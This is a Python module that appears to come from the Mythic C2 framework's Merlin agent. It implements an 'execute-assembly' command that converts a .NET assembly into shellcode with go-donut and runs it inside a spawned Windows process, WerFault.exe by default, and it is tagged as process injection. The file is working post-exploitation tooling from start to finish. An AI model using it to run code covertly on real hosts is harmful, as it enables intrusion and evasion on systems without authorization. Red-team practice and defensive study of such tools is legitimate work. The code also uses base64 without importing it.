
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicResponseRPC import *
import os
import json
import subprocess

# Set to enable debug output to Mythic
debug = False


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "assembly": CommandParameter(
                name="assembly",
                type=ParameterType.File,
                description="The .NET assembly you want to execute",
                required=True,
            ),
            "arguments": CommandParameter(
                name="assembly arguments",
                type=ParameterType.String,
                description="Arguments to execute the .NET assembly with",
                required=False,
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process that will be started to execute the assembly in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                required=True,
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Argument to create the spawnto process with, if any",
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = str.split(self.command_line)
                if len(args) > 0:
                    self.add_arg("assembly", args[0], ParameterType.File)
                if len(args) > 1:
                    self.add_arg("arguments", args[1], ParameterType.String)
                if len(args) > 2:
                    self.add_arg("spawnto", args[2], ParameterType.String)
                if len(args) > 3:
                    self.add_arg("spawntoargs", args[3], ParameterType.String)


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute-assembly"
    needs_admin = False
    help_cmd = "execute-assembly"
    description = "Convert a .NET assembly into shellcode with Donut, execute it in the spawnto process, and return the output"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@Ne0nd0g"
    argument_class = ExecuteAssemblyArguments
    attackmapping = ["1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        # Merlin jobs.MODULE
        task.args.add_arg("type", 16, ParameterType.Number)

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [
            donut(task.args.get_arg("assembly"), task.args.get_arg("arguments")),
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("assembly")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass


def donut(assembly, arguments):
    donut_args = ['go-donut', '--in', 'input.exe', '--exit', '2']
    if arguments:
        donut_args.append('--params')
        donut_args.append(arguments)

    # Write file to location in container
    with open('input.exe', 'wb') as w:
        w.write(assembly)

    result = subprocess.run(
        donut_args,
        stdout=subprocess.PIPE
    )

    donut_bytes = bytes
    # Read Donut output
    with open('loader.bin', 'rb') as output:
        donut_bytes = output.read()

    # Close files
    w.close()
    output.close()

    # Remove files
    os.remove("input.exe")
    os.remove("loader.bin")

    # Return Donut shellcode Base64 encoded
    return base64.b64encode(donut_bytes).decode("utf-8")

